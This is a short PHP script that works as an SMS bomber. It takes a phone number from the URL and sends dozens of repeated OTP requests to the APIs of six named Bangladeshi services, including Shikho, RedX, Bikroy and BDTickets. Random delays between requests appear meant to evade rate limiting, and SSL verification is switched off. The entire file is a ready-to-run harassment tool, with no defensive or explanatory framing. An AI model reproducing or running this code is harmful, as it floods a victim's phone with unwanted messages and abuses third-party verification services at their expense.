<?php
header('Content-Type: application/json');
set_time_limit(0); 

if(!isset($_GET['phone']) || empty($_GET['phone'])){
    echo json_encode(["status" => "error", "message" => "Phone number missing"]);
    exit;
}

$phone = $_GET['phone'];
$phone_11 = (substr($phone, 0, 2) === "88") ? substr($phone, 2) : $phone;
$phone_plus88 = "+88" . $phone_11;

$responses = [];

// Request pathanor time-er moddhe random gap toiri korar function
function send_sms($url, $method = 'GET', $data = null, $headers = [], $timeout = 30) {
    // Random delay: 3 theke 5 second er moddhe random time wait korbe
    sleep(rand(3, 5)); 
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_POSTFIELDS => ($data ? json_encode($data) : null),
        CURLOPT_HTTPHEADER => $headers
    ]);
    $res = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
    return $err ? ["error" => $err] : (json_decode($res, true) ?: $res);
}

// Shikho - 3 bar
for($i=1; $i<=3; $i++){
    $responses["shikho_$i"] = send_sms('https://api.shikho.com/auth/v2/send/sms', 'POST', ["phone" => "88".$phone_11, "type" => "student"], ['Content-Type: application/json']);
}

// RedX - 10 bar
for($i=1; $i<=10; $i++){
    $responses["redx_$i"] = send_sms('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'POST', ["phoneNumber" => $phone_11], ['Content-Type: application/json']);
}

// Bikroy - 10 bar
for($i=1; $i<=10; $i++){
    $responses["bikroy_$i"] = send_sms("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", 'GET', null, ['User-Agent: Mozilla/5.0']);
}

// PBS - 5 bar
for($i=1; $i<=5; $i++){
    $responses["pbs_$i"] = send_sms('https://apialpha.pbs.com.bd/api/OTP/generateOTP', 'POST', ["userPhone" => $phone_11], ['Content-Type: application/json']);
}

// Iqra Live - 3 bar
for($i=1; $i<=3; $i++){
    $responses["iqra_$i"] = send_sms("https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11, 'GET', null, ['User-Agent: Mozilla/5.0']);
}

// BDTickets - 5 bar
for($i=1; $i<=5; $i++){
    $responses["bdtickets_$i"] = send_sms('https://api.bdtickets.com:20100/v1/auth', 'POST', ["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"], ['Content-Type: application/json']);
}

echo json_encode($responses, JSON_PRETTY_PRINT);
?>
